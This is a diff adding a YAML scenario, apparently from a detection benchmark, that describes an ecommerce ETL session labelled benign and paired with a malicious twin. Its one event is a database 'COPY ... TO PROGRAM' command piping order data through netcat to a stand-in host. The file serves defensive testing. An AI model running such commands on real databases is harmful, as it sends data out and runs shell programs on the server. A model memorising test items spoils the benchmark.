@@ -1,0 +1,30 @@
+scenario_id: gen_ecommerce_98_copy_to_program_ben_3029b
+family_id: gen_ecommerce_98_copy_to_program_fam_3029
+domain: ecommerce
+time_of_day: 00:50
+default_class: benign
+rule_engine_relationship: benign_false_positive
+sessions:
+- session_label: exfil
+  role: analytics_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 5.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT order_id, status FROM orders WHERE status = 'pending') TO PROGRAM
+      'nc analytics-mirror.datasink.example 443'
+    connects_to:
+      ip: 203.0.113.12
+      port: 8443
+matched_pair_id: gen_ecommerce_98_copy_to_program_pair_3029
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
